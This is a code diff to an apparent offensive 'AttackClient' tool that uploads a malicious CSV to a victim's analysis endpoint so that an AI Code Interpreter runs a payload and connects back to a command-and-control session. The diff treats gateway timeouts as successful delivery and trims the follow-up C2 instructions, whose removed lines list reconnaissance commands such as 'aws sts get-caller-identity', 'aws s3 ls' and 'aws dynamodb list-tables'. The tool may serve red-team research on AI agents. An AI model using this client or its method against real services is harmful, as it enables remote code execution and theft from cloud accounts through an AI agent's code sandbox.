@@ -89,10 +89,15 @@ class AttackClient:
         self,
         csv_path: str,
         message: str = "Please analyze the revenue by customer and show me the top performers",
-        timeout: int = 120,
+        timeout: int = 10,
     ) -> dict:
         """
         Send malicious CSV to victim's analyze endpoint.
+
+        We use a short timeout (default 10s) because we only need the server
+        to *receive* the CSV. Code Interpreter takes much longer to execute
+        the payload, so the ALB will typically return 504 or the request will
+        time out — both mean the payload was delivered successfully.
 
         Args:
             csv_path: Path to malicious CSV file
@@ -105,7 +110,7 @@ class AttackClient:
         url = f"{self.target_url}/analyze/csv"
 
         self.log(f"Target URL: {url}", "info")
-        self.log("Sending attack...", "info")
+        self.log("Sending payload...", "info")
 
         try:
             with open(csv_path, "rb") as f:
@@ -116,7 +121,7 @@ class AttackClient:
 
             if response.status_code == 200:
                 result = response.json()
-                self.log("Attack sent successfully!", "success")
+                self.log("Payload delivered!", "success")
                 self.log(
                     f"Response preview: {str(result.get('response', ''))[:200]}...",
                     "debug",
@@ -126,6 +131,19 @@ class AttackClient:
                     "status": "success",
                     "session_id": self.session_id,
                     "response": result,
+                }
+
+            elif response.status_code in (502, 504):
+                # 502/504 from ALB means the server received the request but
+                # Code Interpreter is still executing. This is expected.
+                self.log(
+                    "Payload delivered! Server is processing (ALB timed out, this is normal).",
+                    "success",
+                )
+                return {
+                    "status": "success",
+                    "session_id": self.session_id,
+                    "message": "Payload delivered, Code Interpreter is executing",
                 }
 
             else:
@@ -138,11 +156,16 @@ class AttackClient:
                 }
 
         except requests.exceptions.Timeout:
-            self.log("Request timed out (payload may be executing)", "warning")
+            # Timeout means the server received the request and is processing.
+            # The payload is executing in Code Interpreter.
+            self.log(
+                "Payload delivered! Server is processing (request timed out, this is normal).",
+                "success",
+            )
             return {
-                "status": "timeout",
+                "status": "success",
                 "session_id": self.session_id,
-                "message": "Request timed out - payload execution likely in progress",
+                "message": "Payload delivered, Code Interpreter is executing",
             }
 
         except requests.exceptions.ConnectionError as e:
@@ -203,11 +226,10 @@ class AttackClient:
         print("-" * 70)
 
         if result["status"] == "success":
-            print("\n  [SUCCESS] Attack delivered successfully!")
-        elif result["status"] == "timeout":
-            print("\n  [LIKELY SUCCESS] Request timed out - payload probably executing")
+            print("\n  [SUCCESS] Payload delivered!")
         else:
-            print(f"\n  [ISSUE] {result.get('error', 'Unknown error')}")
+            print(f"\n  [FAILED] {result.get('error', 'Unknown error')}")
+            print("  The payload was NOT delivered. Check the target URL and try again.")
 
         print(f"\n  Session ID: {self.session_id}")
 
@@ -223,22 +245,12 @@ class AttackClient:
         print("=" * 70)
         print(
             f"""
-  The payload should now be running in the victim's Code Interpreter.
-  Use the C2 CLI to interact with the compromised session:
+  The payload is now running in the victim's Code Interpreter.
+  Connect to the C2 session to send commands:
 
-  1. Send a command:
-     c2 send "whoami" -s {self.session_id}
+    make connect-session
 
-  2. Get output:
-     c2 receive -s {self.session_id}
-
-  3. Or attach interactively:
-     c2 attach {self.session_id}
-
-  4. Example commands to run:
-     c2 send "aws sts get-caller-identity" -s {self.session_id}
-     c2 send "aws s3 ls" -s {self.session_id}
-     c2 send "aws dynamodb list-tables" -s {self.session_id}
+  Session ID: {self.session_id}
 """
         )
         print("=" * 70 + "\n")
